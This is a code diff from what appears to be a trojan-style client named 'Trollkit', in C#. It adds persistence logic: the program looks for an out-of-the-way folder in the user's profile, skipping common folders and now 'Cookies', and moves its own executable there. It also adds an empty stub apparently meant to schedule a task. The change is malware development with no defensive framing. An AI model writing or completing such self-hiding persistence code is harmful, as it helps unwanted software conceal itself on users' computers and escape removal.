@@ -23,7 +23,7 @@ namespace Trollkit_Client.Modules
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
 			string[] dir = Directory.GetFileSystemEntries(path);
 
-			string[] ex_filter = new string[] { "Desktop", "Documents", "My Documents", "Downloads", "Pictures", "Videos", "Music" };
+			string[] ex_filter = new string[] { "Desktop", "Documents", "My Documents", "Downloads", "Pictures", "Videos", "Music", "Cookies" };
 
 			List<string> files = dir.Where(n => !ex_filter.Contains(n.Split('\\').Last())).ToList();
 
@@ -34,6 +34,22 @@ namespace Trollkit_Client.Modules
 			}
 
 			return fndPath;
+		}
+
+		public void moveFileToLocation(string destinationPath)
+		{
+			try {
+				File.Move(AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName, destinationPath + "\\" + AppDomain.CurrentDomain.FriendlyName);
+			}
+			catch (IOException iox)
+			{
+				Console.WriteLine(iox.Message);
+			}
+		}
+
+		public void scheduleTask()
+		{
+
 		}
 	}
 }
